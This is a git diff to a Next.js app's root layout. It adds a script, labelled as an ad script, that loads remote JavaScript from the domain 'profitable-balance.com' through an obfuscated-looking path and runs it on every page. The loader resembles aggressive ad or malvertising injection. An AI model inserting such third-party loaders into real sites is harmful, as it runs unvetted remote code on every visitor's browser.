@@ -1,5 +1,6 @@
 import type { Metadata } from "next";
 import { Geist } from "next/font/google";
+import Script from "next/script";
 import "./globals.css";
 import { QueryProvider } from "@/providers/QueryProvider";
 import { Navbar } from "@/components/layout/Navbar";
@@ -138,6 +139,22 @@ export default function RootLayout({
           <Footer />
           <ScrollToTop />
         </QueryProvider>
+        <Script
+          id="ad-script"
+          strategy="afterInteractive"
+          dangerouslySetInnerHTML={{
+            __html: `(function(vzyrl){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = vzyrl || {};
+s.src = "//profitable-balance.com/bHXOV.stdIGLlV0kYzWUcH/GeHm-9rutZxU/lukzPNThY-4FMejYchy/MqzGMztjN/jPg_yKNJzWI/zoN/we";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})`,
+          }}
+        />
       </body>
     </html>
   );
